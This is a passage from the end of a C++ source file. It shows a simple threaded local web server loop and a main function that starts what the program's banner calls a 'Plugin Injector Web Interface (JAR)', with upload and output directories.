            std::cerr << "Failed to bind to port " << port << std::endl;
            return false;
        }

        if (listen(serverSocket, 10) < 0) {
            std::cerr << "Failed to listen on port " << port << std::endl;
            return false;
        }

        running = true;
        std::cout << "🌐 Web Server started on http://localhost:" << port << std::endl;
        std::cout << "📂 Upload directory: " << uploadDir << std::endl;
        std::cout << "📤 Output directory: " << outputDir << std::endl;
        std::cout << "\n🚀 Open your browser and navigate to: http://localhost:" << port << "\n" << std::endl;

        while (running) {
            sockaddr_in clientAddress;
            socklen_t clientLen = sizeof(clientAddress);
            int clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddress, &clientLen);

            if (clientSocket < 0) {
                if (running) {
                    std::cerr << "Failed to accept connection" << std::endl;
                }
                continue;
            }

            std::thread(&WebServer::handleRequest, this, clientSocket).detach();
        }

        return true;
    }

    void stop() {
        running = false;
        close(serverSocket);
    }
};

int main(int argc, char* argv[]) {
    int port = 8080;
    std::string uploadDir = "uploads";
    std::string outputDir = "web_injected";

    if (argc > 1) {
        port = std::atoi(argv[1]);
    }

    fs::create_directories(uploadDir);
    fs::create_directories(outputDir);

    WebServer server(port, uploadDir, outputDir);
    
    std::cout << "═══════════════════════════════════════════════" << std::endl;
    std::cout << "     Plugin Injector Web Interface (JAR)" << std::endl;
    std::cout << "═══════════════════════════════════════════════" << std::endl;
    
    if (!server.start()) {
        std::cerr << "Failed to start web server" << std::endl;
        return 1;
    }

    return 0;
}
